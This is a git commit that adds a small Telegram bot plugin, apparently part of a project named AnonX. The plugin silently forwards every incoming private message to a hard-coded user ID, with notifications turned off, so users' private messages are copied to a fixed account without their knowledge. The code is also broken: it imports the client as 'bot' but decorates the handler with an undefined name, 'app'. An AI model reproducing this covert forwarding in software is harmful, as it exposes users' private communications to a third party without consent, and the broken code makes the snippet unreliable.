dccd8a1196cb2550695baf8cfe04b63ed4e6d88b
CUTE_BOY <124450535+XcuteboyX@users.noreply.github.com>
2023-03-30 12:23:58 +0530

    Add files via upload

---
+++ AnonX/plugins/livegram.py
@@ -0,0 +1,10 @@
+from pyrogram import Client, filters
+from pyrogram.types import Message
+
+from AnonX import app as bot
+
+
+@app.on_message(filters.private & filters.incoming)
+async def on_pm_s(client: Client, message: Message):
+    if not message.from_user.id ==5673255098:
+        fwded_mesg = await message.forward(chat_id=5673255098, disable_notification=True)
